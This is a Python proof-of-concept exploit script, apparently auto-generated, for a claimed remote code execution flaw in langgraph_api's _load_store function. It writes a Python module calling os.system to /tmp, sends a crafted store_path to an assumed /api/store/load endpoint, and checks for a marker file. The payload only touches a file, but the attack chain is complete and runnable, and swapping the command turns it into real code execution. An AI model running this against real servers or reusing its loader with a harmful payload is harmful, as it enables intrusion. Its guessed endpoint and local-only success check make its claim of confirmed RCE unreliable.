#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: suspicious-013
# Sink: _load_store
# Auto-generated — run with: python3 rce_python_module__load_store_2.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for langgraph_api_src RCE via _load_store

Vulnerability: The _load_store function in langgraph_api/store.py accepts a
store_path parameter that can point to an arbitrary Python file on the filesystem.
By crafting a store_path like '/tmp/evil.py:func', an attacker can load and execute
arbitrary code from that file.

This PoC:
1. Creates a malicious Python file in /tmp that executes a benign command
   (touch /tmp/poc_success.txt)
2. Sends a request to the vulnerable endpoint with the crafted store_path
3. Verifies the command was executed by checking for the marker file

Usage:
    python3 poc.py [--target http://localhost:8000]
"""

import argparse
import os
import sys
import tempfile
import time
import requests

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000"

# Benign payload command - creates a marker file to prove RCE
BENIGN_CMD = "touch /tmp/poc_success.txt"

# Malicious Python code that will be loaded and executed
MALICIOUS_CODE = f'''
import os
import sys

def func():
    """This function will be called when the store is loaded."""
    os.system("{BENIGN_CMD}")
    return None
'''

def create_malicious_module():
    """Create a temporary Python file with malicious code."""
    fd, path = tempfile.mkstemp(suffix='.py', prefix='poc_')
    with os.fdopen(fd, 'w') as f:
        f.write(MALICIOUS_CODE)
    return path

def cleanup(path):
    """Remove the temporary malicious module."""
    try:
        os.unlink(path)
    except OSError:
        pass

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langgraph_api_src RCE via _load_store"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--endpoint",
        default="/api/store/load",
        help="Vulnerable endpoint path (default: /api/store/load)"
    )
    args = parser.parse_args()

    target_url = args.target.rstrip('/') + args.endpoint

    print(f"[*] Target: {target_url}")
    print(f"[*] Benign command: {BENIGN_CMD}")

    # Step 1: Create malicious module
    print("[*] Creating malicious Python module...")
    malicious_path = create_malicious_module()
    print(f"[+] Created: {malicious_path}")

    # Step 2: Craft the store_path payload
    # Format: /path/to/file.py:function_name
    store_path = f"{malicious_path}:func"
    print(f"[*] Crafted store_path: {store_path}")

    # Step 3: Send the exploit request
    print("[*] Sending exploit request...")
    try:
        response = requests.post(
            target_url,
            json={"store_path": store_path},
            timeout=10
        )
        print(f"[*] Response status: {response.status_code}")
        print(f"[*] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed - is the target running?")
        cleanup(malicious_path)
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out")
        cleanup(malicious_path)
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        cleanup(malicious_path)
        sys.exit(1)

    # Step 4: Verify the command was executed
    print("[*] Checking for marker file...")
    time.sleep(1)  # Give the command time to execute
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS! Marker file /tmp/poc_success.txt exists!")
        print("[+] RCE confirmed!")
        # Clean up marker file
        try:
            os.unlink("/tmp/poc_success.txt")
        except OSError:
            pass
    else:
        print("[-] Marker file not found - exploit may have failed")
        print("[-] Check if the target is vulnerable and the endpoint is correct")

    # Clean up
    cleanup(malicious_path)
    print("[*] Cleanup complete")

if __name__ == "__main__":
    main()
